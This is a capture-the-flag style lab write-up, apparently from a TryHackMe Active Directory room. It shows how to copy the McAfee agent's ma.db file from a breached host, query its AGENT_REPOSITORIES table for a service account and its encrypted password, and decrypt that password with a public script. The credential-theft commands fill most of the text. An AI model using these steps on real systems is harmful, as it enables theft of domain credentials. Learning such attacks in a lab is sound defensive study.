# Configuration files

Suppose a breach that gave access to a host on the organisation's network. In that case, configuration files are an 
excellent avenue to explore further for recovering (more) AD credentials. Depending on the host that was breached, 
configuration files may be available for such enumeration: 

* Web application config files
* Service configuration files
* Registry keys
* Centrally deployed applications

Eumeration scripts like Seatbelt could be used to automate this process.

## Configuration file credentials

The example here is the McAfee Enterprise Endpoint Security application, an endpoint detection and 
response (EDR) agent. The application stores an Active Directory credential in the 
`C:\ProgramData\McAfee\Agent\DB\ma.db` file, which could be read by an attacker who has managed to gain a foothold 
on a host where this application is installed.

The `ma.db` file is a SQLite file which can be read using the `sqlite3` utility or the `sqlitebrowser` tool.

We can use the SSH access on the jump host THMJMP1 again. Also, download the Python 2 script to crack the password hash.

Secure Copy the File, using the password: `Password1@`

    scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db ma.db

Inspect the data using `sqlitebrowser` or `sqlite3`. Got to the `AGENT_REPOSITORIES` table and check out the 
`DOMAIN`, `AUTH_USER`, and `AUTH_PASSWD` columns.

```text
sqlite3 ./ma.db

# List the tables in the database
sqlite> .tables
AGENT_CHILD              AGENT_PROXIES            MA_DATACHANNEL_MESSAGES
AGENT_LOGS               AGENT_PROXY_CONFIG     
AGENT_PARENT             AGENT_REPOSITORIES

# Dump the table schema
sqlite> .schema AGENT_REPOSITORIES
CREATE TABLE AGENT_REPOSITORIES(NAME TEXT NOT NULL UNIQUE, REPO_TYPE INTEGER NOT NULL, URL_TYPE INTEGER NOT NULL, NAMESPACE INTEGER NOT NULL, PROXY_USAGE INTEGER NOT NULL, AUTH_TYPE INTEGER NOT NULL, ENABLED INTEGER NOT NULL, SERVER_FQDN TEXT, SERVER_IP TEXT, SERVER_NAME TEXT,PORT INTEGER, SSL_PORT INTEGER,PATH TEXT, DOMAIN TEXT, AUTH_USER TEXT, AUTH_PASSWD TEXT, IS_PASSWD_ENCRYPTED INTEGER NOT NULL, PING_TIME INTEGER NOT NULL, SUBNET_DISTANCE INTEGER NOT NULL, SITELIST_ORDER INTEGER NOT NULL, STATE INTEGER NOT NULL, PRIMARY KEY (NAME) ON CONFLICT REPLACE);

# Select the desired columns from the table
sqlite> SELECT DOMAIN, AUTH_USER, AUTH_PASSWD FROM AGENT_REPOSITORIES;
za.tryhackme.com|svcAV|jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==

# Exit sqlite3
sqlite> .quit
```

We have the account username, `svcAV`, and an encrypted password stored as a base64 string.

Reverse the encrypted password and use the script provided in the exercise files to crack it.

    encrypted_pw='jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q=='
    python2 ./mcafee-sitelist-pwd-decryption-master/mcafee_sitelist_pwd_decrypt.py $encryped_pw

The `svcAV` user account has password `MyStrongPassword!`
